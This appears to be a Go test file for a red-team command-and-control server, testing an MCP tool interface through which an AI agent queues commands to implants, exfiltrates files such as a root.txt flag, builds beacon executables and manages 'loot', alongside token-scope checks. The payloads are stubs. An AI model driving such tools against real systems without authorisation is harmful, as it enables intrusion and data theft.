		}
	}))
	t.Cleanup(ts.Close)
	return newMCPHTTPServer(newMCPTeamserverClient(ts.URL, ""), allowMutation), st
}

func TestMCPHTTPTaskWaitReturnsCompletedResult(t *testing.T) {
	srv, st := newMCPToolTestServer(t, true)
	st.StoreResult(&models.Result{BeaconID: 7, Label: 123, Type: protocol.TaskRun, Output: "ok", ReceivedAt: time.Now()})

	result, err := srv.callTool(json.RawMessage(`{"name":"task.wait","arguments":{"beacon_id":7,"label":123,"timeout_ms":100}}`))
	if err != nil {
		t.Fatalf("callTool: %v", err)
	}
	text := result["content"].([]map[string]any)[0]["text"].(string)
	if !strings.Contains(text, `"label": 123`) || !strings.Contains(text, "ok") {
		t.Fatalf("result text = %s", text)
	}
}

func TestMCPHTTPTaskWaitTimesOut(t *testing.T) {
	srv, _ := newMCPToolTestServer(t, true)

	_, err := srv.callTool(json.RawMessage(`{"name":"task.wait","arguments":{"beacon_id":7,"label":123,"timeout_ms":10}}`))
	if err == nil || !strings.Contains(err.Error(), "timeout waiting for task result") {
		t.Fatalf("err = %v", err)
	}
}

func TestMCPHTTPCommandExecuteQueuesAndWaits(t *testing.T) {
	srv, st := newMCPToolTestServer(t, true)
	st.RegisterBeacon(&models.ImplantMetadata{ID: 7, SessionKey: bytes.Repeat([]byte{1}, 32), Sleep: 1})
	done := make(chan struct{})
	go func() {
		defer close(done)
		for {
			task := st.GetNextTask(7)
			if task != nil {
				st.StoreResult(&models.Result{BeaconID: 7, Label: task.Label, Type: protocol.TaskRun, Output: "whoami-ok", ReceivedAt: time.Now()})
				return
			}
			time.Sleep(10 * time.Millisecond)
		}
	}()

	result, err := srv.callTool(json.RawMessage(`{"name":"command.execute","arguments":{"beacon_id":7,"command":"whoami","timeout_ms":1000}}`))
	if err != nil {
		t.Fatalf("callTool: %v", err)
	}
	<-done
	text := result["content"].([]map[string]any)[0]["text"].(string)
	if !strings.Contains(text, "whoami-ok") {
		t.Fatalf("text = %s", text)
	}
}

func TestMCPLootGetAndDelete(t *testing.T) {
	loot := t.TempDir()
	t.Setenv("BEBOP_LOOT_DIR", loot)
	h, _, _ := setup(t)
	h.store.MarkExfilDone(42, "loot.txt", 7, 4)
	if err := os.WriteFile(filepath.Join(loot, "42_loot.txt"), []byte("loot"), 0600); err != nil {
		t.Fatal(err)
	}
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.Method == http.MethodGet && r.URL.Path == "/api/files/42":
			r.SetPathValue("label", "42")
			h.HandleGetFile(w, r)
		case r.Method == http.MethodDelete && r.URL.Path == "/api/files/42":
			r.SetPathValue("label", "42")
			h.HandleDeleteFile(w, r)
		default:
			http.NotFound(w, r)
		}
	}))
	defer ts.Close()
	srv := newMCPHTTPServer(newMCPTeamserverClient(ts.URL, ""), true)

	got, err := srv.callTool(json.RawMessage(`{"name":"loot.get","arguments":{"label":42,"encoding":"text"}}`))
	if err != nil {
		t.Fatalf("loot.get: %v", err)
	}
	if got["content"].([]map[string]any)[0]["text"].(string) != "loot" {
		t.Fatalf("loot content = %#v", got)
	}
	if _, err := srv.callTool(json.RawMessage(`{"name":"loot.delete","arguments":{"label":42,"confirm":true}}`)); err != nil {
		t.Fatalf("loot.delete: %v", err)
	}
	if h.store.GetExfilFile(42) != nil {
		t.Fatal("loot entry still present")
	}
}

func TestMCPLibraryAndAssemblyUploadDelete(t *testing.T) {
	t.Setenv("BEBOP_LIBRARY_DIR", t.TempDir())
	h, _, _ := setup(t)
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.Method == http.MethodPost && r.URL.Path == "/api/library":
			h.HandleLibraryUpload(w, r)
		case r.Method == http.MethodGet && r.URL.Path == "/api/library":
			h.HandleLibraryList(w, r)
		case r.Method == http.MethodDelete && strings.HasPrefix(r.URL.Path, "/api/library/"):
			r.SetPathValue("name", strings.TrimPrefix(r.URL.Path, "/api/library/"))
			h.HandleLibraryDelete(w, r)
		case r.Method == http.MethodPost && r.URL.Path == "/api/assemblies":
			h.HandleAssemblyUpload(w, r)
		case r.Method == http.MethodGet && r.URL.Path == "/api/assemblies":
			h.HandleAssemblyList(w, r)
		case r.Method == http.MethodDelete && strings.HasPrefix(r.URL.Path, "/api/assemblies/"):
			r.SetPathValue("name", strings.TrimPrefix(r.URL.Path, "/api/assemblies/"))
			h.HandleAssemblyDelete(w, r)
		default:
			http.NotFound(w, r)
		}
	}))
	defer ts.Close()
	srv := newMCPHTTPServer(newMCPTeamserverClient(ts.URL, ""), true)
	obj := make([]byte, 20)
	binary.LittleEndian.PutUint16(obj[:2], 0x8664)

	libraryReq := fmt.Sprintf(`{"name":"library.upload","arguments":{"name":"smoke.obj","content_base64":%q}}`, base64.StdEncoding.EncodeToString(obj))
	if _, err := srv.callTool(json.RawMessage(libraryReq)); err != nil {
		t.Fatalf("library.upload: %v", err)
	}
	list, err := srv.callTool(json.RawMessage(`{"name":"library.list","arguments":{}}`))
	if err != nil {
		t.Fatalf("library.list: %v", err)
	}
	if !strings.Contains(list["content"].([]map[string]any)[0]["text"].(string), "smoke.obj") {
		t.Fatalf("library list missing smoke.obj: %#v", list)
	}
	if _, err := srv.callTool(json.RawMessage(`{"name":"library.delete","arguments":{"name":"smoke.obj","confirm":true}}`)); err != nil {
		t.Fatalf("library.delete: %v", err)
	}

	assemblyReq := fmt.Sprintf(`{"name":"assembly.upload","arguments":{"name":"tool.exe","content_base64":%q}}`, base64.StdEncoding.EncodeToString([]byte("MZ")))
	if _, err := srv.callTool(json.RawMessage(assemblyReq)); err != nil {
		t.Fatalf("assembly.upload: %v", err)
	}
	if _, err := srv.callTool(json.RawMessage(`{"name":"assembly.delete","arguments":{"name":"tool.exe","confirm":true}}`)); err != nil {
		t.Fatalf("assembly.delete: %v", err)
	}
}

func TestMCPListenerCreateListDelete(t *testing.T) {
	h, _, _ := setup(t)
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.Method == http.MethodPost && r.URL.Path == "/api/listeners":
			h.HandleCreateListener(w, r)
		case r.Method == http.MethodGet && r.URL.Path == "/api/listeners":
			h.HandleListListeners(w, r)
		case r.Method == http.MethodDelete && r.URL.Path == "/api/listeners/1":
			r.SetPathValue("id", "1")
			h.HandleDeleteListener(w, r)
		default:
			http.NotFound(w, r)
		}
	}))
	defer ts.Close()
	srv := newMCPHTTPServer(newMCPTeamserverClient(ts.URL, ""), true)

	created, err := srv.callTool(json.RawMessage(`{"name":"listeners.create","arguments":{"name":"mcp-test","scheme":"http","host":"127.0.0.1","port":18081}}`))
	if err != nil {
		t.Fatalf("listeners.create: %v", err)
	}
	if !strings.Contains(created["content"].([]map[string]any)[0]["text"].(string), `"id": 1`) {
		t.Fatalf("create response = %#v", created)
	}
	list, err := srv.callTool(json.RawMessage(`{"name":"listeners.list","arguments":{}}`))
	if err != nil {
		t.Fatalf("listeners.list: %v", err)
	}
	if !strings.Contains(list["content"].([]map[string]any)[0]["text"].(string), "mcp-test") {
		t.Fatalf("list response = %#v", list)
	}
	if _, err := srv.callTool(json.RawMessage(`{"name":"listeners.delete","arguments":{"id":1,"confirm":true}}`)); err != nil {
		t.Fatalf("listeners.delete: %v", err)
	}
}

func TestMCPSessionCloseRoutesToCloseSession(t *testing.T) {
	var closed string
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodDelete || r.URL.Path != "/api/session/7" {
			http.NotFound(w, r)
			return
		}
		closed = r.URL.Path
		w.WriteHeader(http.StatusNoContent)
	}))
	defer ts.Close()
	srv := newMCPHTTPServer(newMCPTeamserverClient(ts.URL, ""), true)

	result, err := srv.callTool(json.RawMessage(`{"name":"session.close","arguments":{"beacon_id":7}}`))
	if err != nil {
		t.Fatalf("session.close: %v", err)
	}
	if closed != "/api/session/7" {
		t.Fatalf("closed path = %q", closed)
	}
	if !strings.Contains(result["content"].([]map[string]any)[0]["text"].(string), `"closed": 7`) {
		t.Fatalf("close result = %#v", result)
	}
}

func TestMCPFileUploadAndDownloadQueue(t *testing.T) {
	h, st, _ := setup(t)
	st.RegisterBeacon(&models.ImplantMetadata{ID: 7, SessionKey: bytes.Repeat([]byte{1}, 32), Sleep: 1})
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.Method == http.MethodPost && r.URL.Path == "/api/upload":
			h.HandleUpload(w, r)
		case r.Method == http.MethodPost && r.URL.Path == "/api/task":
			h.HandleQueueTask(w, r)
		default:
			http.NotFound(w, r)
		}
	}))
	defer ts.Close()
	srv := newMCPHTTPServer(newMCPTeamserverClient(ts.URL, ""), true)

	uploadReq := fmt.Sprintf(`{"name":"file.upload","arguments":{"beacon_id":7,"dest_path":"C:\\Temp\\x.bin","filename":"x.bin","content_base64":%q}}`, base64.StdEncoding.EncodeToString([]byte{1, 2, 3}))
	if _, err := srv.callTool(json.RawMessage(uploadReq)); err != nil {
		t.Fatalf("file.upload: %v", err)
	}
	stage := st.GetNextTask(7)
	if stage == nil || stage.Type != protocol.TaskFileStage {
		t.Fatalf("stage task = %#v", stage)
	}
	if _, err := srv.callTool(json.RawMessage(`{"name":"file.download","arguments":{"beacon_id":7,"remote_path":"C:\\Temp\\loot.txt","wait":false}}`)); err != nil {
		t.Fatalf("file.download: %v", err)
	}
	download := st.GetNextTask(7)
	if download == nil || download.Type != protocol.TaskFileExfil {
		t.Fatalf("download task = %#v", download)
	}
}

func TestMCPBeaconBuildReturnsBinaryPayload(t *testing.T) {
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost || r.URL.Path != "/api/build" {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Header().Set("Content-Disposition", `attachment; filename="beacon.exe"`)
		_, _ = w.Write([]byte("MZ"))
	}))
	defer ts.Close()
	srv := newMCPHTTPServer(newMCPTeamserverClient(ts.URL, ""), true)

	result, err := srv.callTool(json.RawMessage(`{"name":"beacon.build","arguments":{"listener_id":1}}`))
	if err != nil {
		t.Fatalf("beacon.build: %v", err)
	}
	text := result["content"].([]map[string]any)[0]["text"].(string)
	if !strings.Contains(text, `"filename": "beacon.exe"`) || !strings.Contains(text, `"content_base64": "TVo="`) {
		t.Fatalf("build payload = %s", text)
	}
}

func TestMCPTerminalFileBrowserEventsAndChat(t *testing.T) {
	h, st, _ := setup(t)
	st.RegisterBeacon(&models.ImplantMetadata{ID: 7, SessionKey: bytes.Repeat([]byte{1}, 32), Sleep: 1})
	ts := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case r.Method == http.MethodPost && r.URL.Path == "/api/task":
			h.HandleQueueTask(w, r)
		case r.Method == http.MethodGet && r.URL.Path == "/api/results/7":
			r.SetPathValue("id", "7")
			h.HandleGetResults(w, r)
		case r.Method == http.MethodGet && r.URL.Path == "/api/terminal/7":
			r.SetPathValue("id", "7")
			h.HandleGetTerminal(w, r)
		case r.Method == http.MethodPut && r.URL.Path == "/api/terminal/7":
			r.SetPathValue("id", "7")
			h.HandlePutTerminal(w, r)
		case r.Method == http.MethodGet && r.URL.Path == "/api/events":
			h.HandleGetEvents(w, r)
		case r.Method == http.MethodPost && r.URL.Path == "/api/events":
			h.HandlePostEvent(w, r)
		case r.Method == http.MethodGet && r.URL.Path == "/api/chat":
			h.HandleChatList(w, r)
		case r.Method == http.MethodPost && r.URL.Path == "/api/chat":
			h.HandleChatPost(w, r)
		default:
			http.NotFound(w, r)
		}
	}))
	defer ts.Close()
	srv := newMCPHTTPServer(newMCPTeamserverClient(ts.URL, ""), true)

	if _, err := srv.callTool(json.RawMessage(`{"name":"terminal.put","arguments":{"beacon_id":7,"state":{"output_log":[{"text":"ready","cls":"hint"}],"cmd_history":["pwd"],"poll_since":1}}}`)); err != nil {
		t.Fatalf("terminal.put: %v", err)
	}
	terminalState, err := srv.callTool(json.RawMessage(`{"name":"terminal.get","arguments":{"beacon_id":7}}`))
	if err != nil {
		t.Fatalf("terminal.get: %v", err)
	}
	if !strings.Contains(terminalState["content"].([]map[string]any)[0]["text"].(string), "ready") {
		t.Fatalf("terminal state = %#v", terminalState)
	}

	go func() {
		for {
			task := st.GetNextTask(7)
			if task != nil {
				st.StoreResult(&models.Result{
					BeaconID:   7,
					Label:      task.Label,
					Type:       protocol.TaskRun,
					Output:     "filebrowser\n[{\"name\":\"Temp\",\"type\":\"dir\"}]",
					ReceivedAt: time.Now(),
				})
				return
			}
			time.Sleep(10 * time.Millisecond)
		}
	}()
	fb, err := srv.callTool(json.RawMessage(`{"name":"filebrowser.list","arguments":{"beacon_id":7,"path":"C:\\","timeout_ms":1000}}`))
	if err != nil {
		t.Fatalf("filebrowser.list: %v", err)
	}
	if !strings.Contains(fb["content"].([]map[string]any)[0]["text"].(string), "Temp") {
		t.Fatalf("filebrowser result = %#v", fb)
	}
	cache, err := srv.callTool(json.RawMessage(`{"name":"filebrowser.cache.get","arguments":{"beacon_id":7}}`))
	if err != nil {
		t.Fatalf("filebrowser.cache.get: %v", err)
	}
	if !strings.Contains(cache["content"].([]map[string]any)[0]["text"].(string), "Temp") {
		t.Fatalf("filebrowser cache = %#v", cache)
	}

	if _, err := srv.callTool(json.RawMessage(`{"name":"events.add","arguments":{"type":"mcp","message":"hello event"}}`)); err != nil {
		t.Fatalf("events.add: %v", err)
	}
	if _, err := srv.callTool(json.RawMessage(`{"name":"chat.send","arguments":{"message":"hello chat"}}`)); err != nil {
		t.Fatalf("chat.send: %v", err)
	}
	chat, err := srv.callTool(json.RawMessage(`{"name":"chat.list","arguments":{"limit":10}}`))
	if err != nil {
		t.Fatalf("chat.list: %v", err)
	}
	if !strings.Contains(chat["content"].([]map[string]any)[0]["text"].(string), "hello chat") {
		t.Fatalf("chat list = %#v", chat)
	}
}

func TestMCPCommandCatalogAndDescribe(t *testing.T) {
	srv := newMCPHTTPServer(nil, false)

	list, err := srv.callTool(json.RawMessage(`{"name":"commands.list","arguments":{"platform":"windows"}}`))
	if err != nil {
		t.Fatalf("commands.list: %v", err)
	}
	text := list["content"].([]map[string]any)[0]["text"].(string)
	if !strings.Contains(text, `"name": "whoami"`) || !strings.Contains(text, `"name": "ldapsearch"`) {
		t.Fatalf("catalog = %s", text)
	}

	desc, err := srv.callTool(json.RawMessage(`{"name":"command.describe","arguments":{"name":"cat"}}`))
	if err != nil {
		t.Fatalf("command.describe: %v", err)
	}
	if !strings.Contains(desc["content"].([]map[string]any)[0]["text"].(string), `"required": true`) {
		t.Fatalf("describe = %#v", desc)
	}
}

func TestMCPFsCatQueuesCatCommand(t *testing.T) {
	srv, st := newMCPToolTestServer(t, true)
	st.RegisterBeacon(&models.ImplantMetadata{ID: 7, SessionKey: bytes.Repeat([]byte{1}, 32), Sleep: 1})
	done := make(chan *models.Task, 1)
	go func() {
		for {
			task := st.GetNextTask(7)
			if task != nil {
				done <- task
				st.StoreResult(&models.Result{BeaconID: 7, Label: task.Label, Type: protocol.TaskRun, Output: "secret", ReceivedAt: time.Now()})
				return
			}
			time.Sleep(10 * time.Millisecond)
		}
	}()

	result, err := srv.callTool(json.RawMessage(`{"name":"fs.cat","arguments":{"beacon_id":7,"path":"C:\\Users\\Administrator\\Desktop\\root.txt","timeout_ms":1000}}`))
	if err != nil {
		t.Fatalf("fs.cat: %v", err)
	}
	task := <-done
	decoded := string(task.Data)
	if !strings.Contains(decoded, "cat") || !strings.Contains(decoded, "root.txt") {
		t.Fatalf("queued data = %q", decoded)
	}
	if !strings.Contains(result["content"].([]map[string]any)[0]["text"].(string), "secret") {
		t.Fatalf("result = %#v", result)
	}
}

func TestMCPPlainTokenRequiresOperatorBinding(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "plain-token")
	if _, ok := validateMCPToken("plain-token"); ok {
		t.Fatal("plain MCP signing secret should not authenticate without operator binding")
	}
	first := makeMCPOperatorToken("plain-token", "alice")
	second := makeMCPOperatorToken("plain-token", "alice")
	if first == "" || second == "" {
		t.Fatal("operator-bound token generation failed")
	}
	if first == second {
		t.Fatal("operator-bound tokens should include a per-token nonce")
	}
	authCtx, ok := validateMCPToken(first)
	if !ok {
		t.Fatal("operator-bound token did not validate")
	}
	if authCtx.Operator != "alice" {
		t.Fatalf("operator = %q, want alice", authCtx.Operator)
	}
	if !authCtx.HasScope(mcpScopeBuild) || !authCtx.HasScope(mcpScopeAdmin) {
		t.Fatalf("plain token scopes = %#v", authCtx.Scopes)
	}
}

func TestMCPOperatorTokenRejectsExpiredToken(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "plain-token")
	operator := "alice"
	encodedOperator := base64.RawURLEncoding.EncodeToString([]byte(operator))
	nonce := base64.RawURLEncoding.EncodeToString([]byte("fixed nonce for test"))
	signature := signMCPOperatorTokenV3("plain-token", operator, "1", "2", nonce)
	token := "mcp3." + encodedOperator + ".1.2." + nonce + "." + signature
	if _, ok := validateMCPToken(token); ok {
		t.Fatal("expired MCP operator token validated")
	}
}

func TestMCPOperatorTokenSanitizesOperatorName(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "plain-token")
	token := makeMCPOperatorToken("plain-token", "alice'\noperator 'bob")
	authCtx, ok := validateMCPToken(token)
	if !ok {
		t.Fatal("operator-bound token did not validate")
	}
	if strings.ContainsAny(authCtx.Operator, "'\r\n\t ") {
		t.Fatalf("operator was not sanitized: %q", authCtx.Operator)
	}
	if !strings.HasPrefix(authCtx.Operator, "alice_") {
		t.Fatalf("operator = %q, want sanitized alice prefix", authCtx.Operator)
	}
}

func TestMCPScopedTokenBlocksMissingScope(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "token=scoped-token\nscopes=read,task")
	authCtx, ok := validateMCPToken(makeMCPOperatorToken("scoped-token", "alice"))
	if !ok {
		t.Fatal("scoped token did not validate")
	}
	srv := newMCPHTTPServer(newMCPTeamserverClient("http://127.0.0.1:1", ""), true)
	srv.auth = authCtx

	_, err := srv.callTool(json.RawMessage(`{"name":"library.upload","arguments":{"name":"x.exe","content_base64":"TVo="}}`))
	if err == nil || !strings.Contains(err.Error(), "missing MCP scope: library") {
		t.Fatalf("err = %v", err)
	}
}

func TestMCPScopedTokenFiltersToolsList(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "token=scoped-token\nscopes=read,task")
	t.Setenv("BEBOP_MCP_ALLOW_MUTATION", "1")
	h, _, _ := setup(t)
	req := httptest.NewRequest(http.MethodPost, "/api/mcp", strings.NewReader(`{"jsonrpc":"2.0","id":1,"method":"tools/list"}`))
	req.Header.Set("Authorization", "Bearer "+makeMCPOperatorToken("scoped-token", "alice"))
	w := httptest.NewRecorder()

	h.mcpHTTPAuthMiddleware(h.HandleMCPRPC)(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	var got struct {
		Result struct {
			Tools []struct {
				Name string `json:"name"`
			} `json:"tools"`
		} `json:"result"`
	}
	if err := json.NewDecoder(w.Body).Decode(&got); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	names := make([]string, 0, len(got.Result.Tools))
	for _, tool := range got.Result.Tools {
		names = append(names, tool.Name)
	}
	if !containsString(names, "command.run") {
		t.Fatal("task-scoped tool missing")
	}
	if containsString(names, "library.upload") {
		t.Fatal("library-scoped tool exposed to read,task token")
	}
}

func TestMCPScopedTokenRequiresReadScopeForResources(t *testing.T) {
	t.Setenv("BEBOP_MCP_TOKEN", "token=task-token\nscopes=task")
	h, _, _ := setup(t)
	req := httptest.NewRequest(http.MethodPost, "/api/mcp", strings.NewReader(`{"jsonrpc":"2.0","id":1,"method":"resources/list"}`))
	req.Header.Set("Authorization", "Bearer "+makeMCPOperatorToken("task-token", "alice"))
	w := httptest.NewRecorder()

	h.mcpHTTPAuthMiddleware(h.HandleMCPRPC)(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("status = %d body = %q", w.Code, w.Body.String())
	}
	var got struct {
		Error *mcpRPCError `json:"error"`
	}
	if err := json.NewDecoder(w.Body).Decode(&got); err != nil {
		t.Fatalf("decode response: %v", err)
	}
	if got.Error == nil || !strings.Contains(got.Error.Message, "missing MCP scope: read") {
		t.Fatalf("error = %#v", got.Error)
	}
}

func TestMCPDeleteRequiresConfirm(t *testing.T) {
	srv := newMCPHTTPServer(newMCPTeamserverClient("http://127.0.0.1:1", ""), true)

	_, err := srv.callTool(json.RawMessage(`{"name":"loot.delete","arguments":{"label":42}}`))
	if err == nil || !strings.Contains(err.Error(), "confirm=true required") {
		t.Fatalf("err = %v", err)
	}
}

func containsString(values []string, want string) bool {
	for _, value := range values {
		if value == want {
			return true
		}
	}
	return false
}

func setupTestHandler(t *testing.T) (*Handler, *models.Beacon, *rsa.PrivateKey) {
	t.Helper()
	priv, err := protocol.GenerateRSAKey()
	if err != nil {
		t.Fatalf("RSA keygen: %v", err)
	}
	s := newTestStore(t)
	h := NewHandler(s, priv, "", &noopLM{}, &nopPersister{}, 0, nil, NewHub(), nil, nil, nil)
	sessionKey := make([]byte, 32)
	rand.Read(sessionKey)
	s.RegisterBeacon(&models.ImplantMetadata{ID: 1, SessionKey: sessionKey, Sleep: 5, Hostname: "test-host"})
	beacon := s.GetBeacon(1)
	return h, beacon, priv
}

func newTestHandler(t *testing.T) *Handler {
	t.Helper()
	key, err := protocol.GenerateRSAKey()
	if err != nil {
		t.Fatal(err)
	}
	return NewHandler(newTestStore(t), key, "", &noopLM{}, &nopPersister{}, 0, nil, NewHub(), nil, nil, nil)
}

func registerTestBeacon(t *testing.T, h *Handler, beaconID uint32, platform uint8) []byte {
	t.Helper()
	return registerTestBeaconWithArch(t, h, beaconID, platform, 1)
}

func registerTestBeaconWithArch(t *testing.T, h *Handler, beaconID uint32, platform, arch uint8) []byte {
	t.Helper()
	sessionKey := make([]byte, 32)
	if _, err := rand.Read(sessionKey); err != nil {
		t.Fatalf("rand.Read: %v", err)
	}
	if !h.store.RegisterBeacon(&models.ImplantMetadata{
		ID:         beaconID,
		SessionKey: sessionKey,
		Sleep:      5,
		Arch:       arch,
		Platform:   platform,
		Hostname:   "test-host",
	}) {
		t.Fatalf("RegisterBeacon(%d) failed", beaconID)
	}
	return sessionKey
}

func newInlineAssemblyRequest(t *testing.T, fields map[string]string, assemblyField, filename string, assemblyBytes []byte) *http.Request {
	t.Helper()
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	for k, v := range fields {
		if err := writer.WriteField(k, v); err != nil {
			t.Fatalf("WriteField(%s): %v", k, err)
		}
	}
	if assemblyField != "" {
		part, err := writer.CreateFormFile(assemblyField, filename)
		if err != nil {
			t.Fatalf("CreateFormFile: %v", err)
		}
		if _, err := part.Write(assemblyBytes); err != nil {
			t.Fatalf("part.Write: %v", err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("writer.Close: %v", err)
	}
	req := httptest.NewRequest(http.MethodPost, "/api/inline-assembly", &body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	return req
}

func newBOFRequest(t *testing.T, fields map[string]string, filename string, objectBytes []byte) *http.Request {
	t.Helper()
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	for k, v := range fields {
		if err := writer.WriteField(k, v); err != nil {
			t.Fatalf("WriteField(%s): %v", k, err)
		}
	}
	part, err := writer.CreateFormFile("object", filename)
	if err != nil {
		t.Fatalf("CreateFormFile: %v", err)
	}
	if _, err := part.Write(objectBytes); err != nil {
		t.Fatalf("part.Write: %v", err)
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("writer.Close: %v", err)
	}
	req := httptest.NewRequest(http.MethodPost, "/api/bof", &body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	return req
}

func newBOFNameRequest(t *testing.T, fields map[string]string) *http.Request {
	t.Helper()
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	for k, v := range fields {
		if err := writer.WriteField(k, v); err != nil {
			t.Fatalf("WriteField(%s): %v", k, err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("writer.Close: %v", err)
	}
	req := httptest.NewRequest(http.MethodPost, "/api/bof", &body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	return req
}

func newLibraryUploadRequest(t *testing.T, name, filename string, fileBytes []byte) *http.Request {
	t.Helper()
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)
	if name != "" {
		if err := writer.WriteField("name", name); err != nil {
			t.Fatalf("WriteField(name): %v", err)
		}
	}
	part, err := writer.CreateFormFile("file", filename)
	if err != nil {
		t.Fatalf("CreateFormFile: %v", err)
	}
	if _, err := part.Write(fileBytes); err != nil {
		t.Fatalf("part.Write: %v", err)
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("writer.Close: %v", err)
	}
	req := httptest.NewRequest(http.MethodPost, "/api/library", &body)
	req.Header.Set("Content-Type", writer.FormDataContentType())
	return req
}

func decodeBOFReqForTest(t *testing.T, payload []byte) (obj, args []byte) {
	t.Helper()
	if len(payload) < 8 {
		t.Fatalf("BOF payload too short: %d", len(payload))
	}
	objLen := binary.LittleEndian.Uint32(payload[:4])
	if uint32(len(payload)) < 4+objLen+4 {
		t.Fatalf("BOF payload truncated")
	}
	obj = payload[4 : 4+objLen]
	argsOff := 4 + int(objLen)
	argsLen := binary.LittleEndian.Uint32(payload[argsOff : argsOff+4])
	if uint32(len(payload)) < uint32(argsOff)+4+argsLen {
		t.Fatalf("BOF args truncated")
	}
	args = payload[argsOff+4 : argsOff+4+int(argsLen)]
	return obj, args
}

func decodeInlineBOFArgsForTest(t *testing.T, payload []byte) (bridge, assembly []byte, args []string) {
	t.Helper()
	off := 0
	readBlob := func(name string) []byte {
		if len(payload)-off < 4 {
			t.Fatalf("%s length missing", name)
		}
		n := int(binary.LittleEndian.Uint32(payload[off:]))
		off += 4
		if n < 0 || len(payload)-off < n {
			t.Fatalf("%s truncated", name)
		}
		out := payload[off : off+n]
		off += n
		return out
	}
	bridge = readBlob("bridge")
	assembly = readBlob("assembly")
	if len(payload)-off < 4 {
		t.Fatalf("argc missing")
	}
	argc := int(binary.LittleEndian.Uint32(payload[off:]))
	off += 4
	for i := 0; i < argc; i++ {
		args = append(args, string(readBlob(fmt.Sprintf("arg[%d]", i))))
	}
	if off != len(payload) {
		t.Fatalf("trailing inline BOF args: %d", len(payload)-off)
	}
	return bridge, assembly, args
}

type fakeConn struct {
	writeBuf   bytes.Buffer
	writeErr   error
	closed     bool
	localAddr  net.Addr
	remoteAddr net.Addr
}

func (c *fakeConn) Read(_ []byte) (int, error) { return 0, io.EOF }
func (c *fakeConn) Write(p []byte) (int, error) {
	if c.writeErr != nil {
		return 0, c.writeErr
	}
	return c.writeBuf.Write(p)
}
func (c *fakeConn) Close() error                       { c.closed = true; return nil }
func (c *fakeConn) LocalAddr() net.Addr                { return c.localAddr }
func (c *fakeConn) RemoteAddr() net.Addr               { return c.remoteAddr }
func (c *fakeConn) SetDeadline(_ time.Time) error      { return nil }
func (c *fakeConn) SetReadDeadline(_ time.Time) error  { return nil }
func (c *fakeConn) SetWriteDeadline(_ time.Time) error { return nil }

type fakeAddr string

func (a fakeAddr) Network() string { return "tcp" }
func (a fakeAddr) String() string  { return string(a) }

func newSessionTestHandler(t *testing.T) (*Handler, string) {
	t.Helper()
	key, err := protocol.GenerateRSAKey()
	if err != nil {
		t.Fatal(err)
	}
	s, dbPath := newTestStoreWithPath(t)
	hub := NewHub()
	sl := NewSessionListener(4444, s, &nopPersister{}, hub, nil)
	h := NewHandler(s, key, "", &noopLM{}, &nopPersister{}, 0, sl, hub, nil, nil, nil)
	return h, dbPath
}

func fetchTaskStatus(t *testing.T, dbPath string, beaconID uint32, taskType uint8) string {
	t.Helper()
	db, err := sql.Open("sqlite3", dbPath)
	if err != nil {
		t.Fatalf("sql.Open: %v", err)
	}
	defer db.Close()

	var status string
	if err := db.QueryRow(`SELECT status FROM tasks WHERE beacon_id = ? AND type = ? ORDER BY id DESC LIMIT 1`, beaconID, taskType).Scan(&status); err != nil {
		t.Fatalf("query status: %v", err)
	}
	return status
}

func decodeSentTaskEnvelope(t *testing.T, sessionKey []byte, raw []byte) protocol.Message {
	t.Helper()
	if len(raw) < 4 {
		t.Fatalf("sent payload too short: %d", len(raw))
	}
	envLen := binary.LittleEndian.Uint32(raw[:4])
	if int(envLen) != len(raw[4:]) {
		t.Fatalf("envelope length mismatch: hdr=%d body=%d", envLen, len(raw[4:]))
	}
	plaintext, err := protocol.Decrypt(sessionKey, raw[4:])
	if err != nil {
		t.Fatalf("Decrypt: %v", err)
	}
	if len(plaintext) < 16 {
		t.Fatalf("plaintext too short: %d", len(plaintext))
	}
	hdr, err := protocol.DecodeHeader(plaintext[:16])
	if err != nil {
		t.Fatalf("DecodeHeader: %v", err)
	}
	return protocol.Message{Header: hdr, Data: plaintext[16:]}
}

func waitForHubEvent(t *testing.T, ch <-chan Event, topic, action string) Event {
	t.Helper()
	timeout := time.After(2 * time.Second)
	for {
		select {
		case evt := <-ch:
			if evt.Topic == topic && evt.Action == action {
				return evt
			}
		case <-timeout:
			t.Fatalf("timed out waiting for %s/%s event", topic, action)
		}
	}
}

func TestHandleGetPubKey(t *testing.T) {
	h, _, _ := setup(t)
	req := httptest.NewRequest("GET", "/api/pubkey", nil)
	w := httptest.NewRecorder()
	h.HandleGetPubKey(w, req)

	if w.Code != 200 {
		t.Fatalf("expected 200, got %d", w.Code)
	}
	block, _ := pem.Decode(w.Body.Bytes())
	if block == nil || block.Type != "PUBLIC KEY" {
		t.Fatal("expected PUBLIC KEY PEM block")
	}
}

